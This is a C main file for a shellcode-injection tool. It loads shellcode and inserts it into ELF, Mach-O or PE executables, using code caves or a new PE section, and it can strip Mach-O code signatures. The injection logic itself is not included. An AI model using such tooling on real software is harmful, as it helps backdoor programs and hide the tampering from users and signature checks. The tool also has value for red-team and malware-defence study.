#include <stdio.h>
#include <string.h>
#include "shinject.h"
int main (int argc , char *argv[]){
    int type;
    if(argc<1){
        printf("not enough arguments provided ");
        return -1;

    }
    int ret = 0;
    if(strcmp(argv[1],"-rm")==0){
        if(argc<3){
            printf("file not specifed");
            return -1;
        }
        type = file_type(argv[2]);
        if(type == MACH_O){
    ret =  MACH_O_sig_remove(argv[2]);
        }
    }
    if(strcmp(argv[1],"-i")==0){
        if(argc<4){
            printf("not all arguments provided ");
            return -1;

        }
        uint32_t shellcode_len;
char *shellcode = load_file(argv[3],&shellcode_len);
    type = file_type(argv[2]);
    if(type == ELF){
        ret = ELF_inject(argv[2],shellcode,shellcode_len);
    }
    if(type == MACH_O){
        ret = MACH_O_inject(argv[2],shellcode,shellcode_len);
    }
    if(type == PE){
        ret = PE_code_cave(argv[2],shellcode,shellcode_len);
        if (ret==-1){
            printf("couldn't find code cave");
            ret = PE_new_section(argv[2],"abc",shellcode,shellcode_len);
        }
    }
   if(ret==0){
    printf("success");
   }
   else{
    printf("error");
   }
    }
   return ret;
}
